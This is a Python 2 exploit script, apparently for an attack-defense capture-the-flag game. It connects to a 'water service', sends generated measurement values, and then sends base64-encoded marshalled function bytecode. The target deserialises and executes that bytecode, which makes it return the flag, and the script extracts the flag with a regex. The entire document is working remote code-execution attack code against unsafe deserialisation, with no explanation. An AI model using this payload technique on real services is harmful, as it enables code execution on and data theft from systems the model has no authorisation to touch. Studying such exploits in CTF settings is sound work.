#####################################################

# -*- coding: utf-8 -*-


class Exploit(object):

    def callback(self):
        clientsock.send(str(flag) + "\n")

    def execute(self, ip, port, flag_id):
        
        ## Exploit specific imports
        import re, base64, marshal, random, socket
        
        ## Set up socket to water service
        s = socket.socket()
        s.connect((ip, port))
        s.settimeout(3)

        ## Generate measurements
        count = [4, 2, 1, 1, 1, 1, 1, 1, 1]
        inp = []
        for x in range(1,10):
                for y in range(count[x-1]):
                        tmp = str(x) + str(random.randint(1,100000))
                        inp.append(tmp)
        measurements = ','.join(inp)

        ## Send measurements
        s.send(str(measurements)+"\n")
        s.recv(1024)
        
        ## Generate payload
        payload = base64.b64encode(marshal.dumps(self.callback.func_code))
        
        ## Send payload
        s.send(payload + "\n")

        ## Recover the flag
        flag = s.recv(1024).rstrip()
        flag = re.compile('(FLG\w+)').search(flag).groups(1)[0]
        self.flag = flag.rstrip()

    def result(self):
        return {'FLAG' : self.flag }
        
#########################################################